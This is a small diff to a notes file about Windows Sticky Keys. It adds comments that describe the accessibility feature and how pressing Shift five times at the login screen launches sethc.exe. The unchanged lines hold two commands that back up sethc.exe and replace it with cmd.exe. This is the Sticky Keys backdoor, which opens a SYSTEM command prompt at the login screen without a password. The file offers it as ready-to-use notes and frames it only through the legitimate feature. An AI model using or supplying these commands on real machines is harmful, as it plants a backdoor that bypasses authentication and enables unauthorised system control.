@@ -1,6 +1,12 @@
 #stikeykeez_notes.txt
-#
-#
+#Sticky Keys is part of Windows Ease of Access features
+# that allows a user to tap the Shift, Ctrl, Alt 
+# or Windows key once to achieve the same effect 
+# as holding the key down. If you press the SHIFT key 5 times 
+# in a row at Windows login screen, the Sticky Keys application (sethc.exe) 
+# will launch and ask if you want to enable sticky keys feature.
+
+
 move C:\windows\system32\sethc.exe  c:\windows\system32\sethc.exe.bak
 copy c:\windows\system32\cmd.exe  c:\windows\system32\sethc.exe 
 
